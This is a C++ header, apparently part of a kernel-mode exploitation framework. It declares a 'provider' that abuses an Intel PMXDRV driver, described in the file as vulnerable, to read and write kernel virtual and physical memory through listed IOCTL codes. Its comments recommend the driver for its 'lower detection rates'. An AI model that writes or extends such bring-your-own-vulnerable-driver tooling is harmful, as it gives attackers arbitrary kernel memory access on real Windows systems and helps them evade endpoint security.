/**
 * @file IntelPmxProvider.h
 * @author GitHub Copilot
 * @date September 9, 2025
 * @brief Intel PMXDRV provider implementation (KDU ID: 52).
 * 
 * Modern Intel driver with full memory access and V2P translation.
 * Good Win 10/11 compatibility and lower detection rates.
 */

#pragma once

#include "BaseProvider.h"

namespace KernelMode {
    namespace Providers {

        // Intel PMXDRV IOCTL codes (from KDU analysis)
        #define IOCTL_PMXDRV_READ_MEMORY        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x220, METHOD_BUFFERED, FILE_ANY_ACCESS)
        #define IOCTL_PMXDRV_WRITE_MEMORY       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x221, METHOD_BUFFERED, FILE_ANY_ACCESS)
        #define IOCTL_PMXDRV_READ_PHYSICAL      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x222, METHOD_BUFFERED, FILE_ANY_ACCESS)
        #define IOCTL_PMXDRV_WRITE_PHYSICAL     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x223, METHOD_BUFFERED, FILE_ANY_ACCESS)
        #define IOCTL_PMXDRV_V2P_TRANSLATE      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x224, METHOD_BUFFERED, FILE_ANY_ACCESS)

        // Intel PMXDRV memory request structure
        #pragma pack(push, 1)
        struct PMXDRV_MEMORY_REQUEST {
            using TAddress = ULONG64;
            using TSize = ULONG;
            ULONG64 address;
            ULONG64 buffer;
            ULONG size;
            ULONG operation;
        };
        #pragma pack(pop)

        /**
         * @class IntelPmxProvider
         * @brief Intel PMXDRV vulnerable driver provider
         */
        class IntelPmxProvider : public BaseProvider<PMXDRV_MEMORY_REQUEST> {
        public:
            IntelPmxProvider();
            ~IntelPmxProvider() override = default;

            // Override for Intel-specific implementations
            uintptr_t VirtualToPhysical(uintptr_t virtualAddress) override;

        protected:
            void SetupMemoryRequest(PMXDRV_MEMORY_REQUEST& request, uintptr_t address, uintptr_t buffer, size_t size) override;

        private:
            static ProviderConfig CreateConfig();
            static ProviderLoadData CreateLoadData();
        };

    } // namespace Providers
} // namespace KernelMode
